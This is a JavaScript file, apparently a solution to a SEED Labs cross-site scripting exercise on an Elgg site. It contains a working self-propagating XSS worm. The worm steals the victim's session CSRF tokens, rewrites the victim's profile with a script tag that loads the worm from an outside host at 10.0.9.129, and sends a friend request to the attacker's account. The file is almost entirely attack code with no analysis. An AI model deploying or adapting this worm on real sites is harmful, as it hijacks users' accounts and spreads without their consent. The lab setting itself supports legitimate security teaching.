/*
    In Samy's profile, using this script
    <script type="text/javascript" src="http://<IP Address:Port>/task6_link.js">
    </script>
*/
//<script type="text/javascript">           No need to defind <script> tag
// alert("Attackkkk!");
window.onload = function(){
    // If victim is not Samy
    if(elgg.session.user.guid != "59"){
        var Ajax = null; 
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
        var name = "&name=" + elgg.session.user.name;
        var guid = "&guid=" + elgg.session.user.guid;        
        var wormCode = encodeURIComponent('<script type="text/javascript" src="http://10.0.9.129:80/task6_link.js"' + "</script>");
        var about_me = "&description=PWNED by Samy!!!" + wormCode + "&accesslevel[description]=2";

        // Modifying victim's profile
        var content = token + ts + name + about_me + guid;
        var sendurl = "http://www.seed-server.com/action/profile/edit";
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
        // alert("Modifying profile succesfully!!!");
        
        // Add Samy a friend request
        var friend="friend=59";     // The link
        // Construct a HTTP Request to send Samy a friend request
        sendurl = "http://www.seed-server.com/action/friends/add?" + friend + ts + token;
        // Create AJAX request to add friend - AJAX: Asynchronous JavaScript And XML.
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl);
        Ajax.send();
        alert("Modified and sent a friend request!!!");
    }
    else
    {
        alert("Failed!!!");
    }
}
//</script>